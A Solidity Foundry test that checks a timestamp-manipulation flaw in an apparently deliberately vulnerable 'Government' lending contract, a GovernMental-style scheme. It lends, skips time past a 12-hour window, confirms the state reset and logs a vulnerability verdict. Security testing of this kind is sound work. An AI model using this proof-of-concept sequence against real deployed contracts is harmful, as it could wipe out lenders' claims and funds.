// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/list_dos.sol";

contract GovernmentTimestampManipulationTest is Test {
    Government gov;
    address account1 = address(0x123);
    address account2 = address(0x456);

    function setUp() public {
        // Deploy contract with 1 ether initial funding
        gov = new Government{value: 1 ether}();
        // Fund lender accounts
        vm.deal(account1, 1 ether);
        vm.deal(account2, 1 ether);
    }

    // Helper function to log state variables
    function _logState(string memory label) internal view {
        console2.log("---", label, "State ---");
        console2.log("Creditor addresses length:", gov.getCreditorAddresses().length);
        console2.log("Total debt:", gov.totalDebt());
        console2.log("Round:", gov.round());
        console2.log("Last time of new credit:", gov.lastTimeOfNewCredit());
        console2.log("Last creditor payed out:", gov.lastCreditorPayedOut());
        console2.log("Profit from crash:", gov.profitFromCrash());
        console2.log("--------------------------");
    }

    function testMinersCanTriggerResetWithTimeManipulation() public {
        // Get initial state snapshot
        _logState("BEFORE-Initial");
        uint256 initialCreditorsLength = gov.getCreditorAddresses().length;
        uint256 initialDebt = gov.totalDebt();
        uint256 initialRound = gov.round();
        
        // First lending within 12-hour window
        vm.prank(account1);
        bool firstLendingResult = gov.lendGovernmentMoney{value: 1 ether}(address(0));
        assertTrue(firstLendingResult, "First lending should succeed");
        assertEq(gov.getCreditorAddresses().length, 1, "Creditors not recorded");

        // Log state after first lending
        _logState("BEFORE-TimeManipulation");
        uint256 afterFirstLendingCreditorsLength = gov.getCreditorAddresses().length;
        uint256 afterFirstLendingDebt = gov.totalDebt();
        uint256 afterFirstLendingRound = gov.round();
        
        // Fast-forward 12 hours + 1 second
        console2.log("--- Trigger Time Manipulation (12h+1s) ---");
        skip(12 hours + 1 seconds);
        
        // Second lending after time window passes
        vm.prank(account2);
        bool secondLendingResult = gov.lendGovernmentMoney{value: 1 ether}(address(0));
        assertFalse(secondLendingResult, "Should trigger reset and return false");

        // Log state after second lending
        _logState("AFTER-SecondLending");
        uint256 afterSecondLendingCreditorsLength = gov.getCreditorAddresses().length;
        uint256 afterSecondLendingDebt = gov.totalDebt();
        uint256 afterSecondLendingRound = gov.round();
        
        // Final validation - Differential assertions
        console2.log("--- Differential Verification Results ---");
        console2.log("Creditors length changed:", 
            initialCreditorsLength, "->", afterSecondLendingCreditorsLength);
        console2.log("Total debt changed:", 
            initialDebt, "->", afterSecondLendingDebt);
        console2.log("Round changed:",
            initialRound, "->", afterSecondLendingRound);
        
        // Verify state reset conditions
        bool creditorsReset = (initialCreditorsLength == 0) && 
                              (afterSecondLendingCreditorsLength == 0);
        bool debtReset = (initialDebt == 0) && 
                        (afterSecondLendingDebt == 0);
        bool roundAdvanced = (afterSecondLendingRound > initialRound);
        
        console2.log("Creditors reset:", creditorsReset ? "YES" : "NO");
        console2.log("Debt reset:", debtReset ? "YES" : "NO");
        console2.log("Round advanced:", roundAdvanced ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (creditorsReset && debtReset && roundAdvanced) {
            console2.log("Vulnerability Exists: Time manipulation triggered state reset");
        } else {
            console2.log("Vulnerability not Exist: State reset conditions not met");
        }
    }
}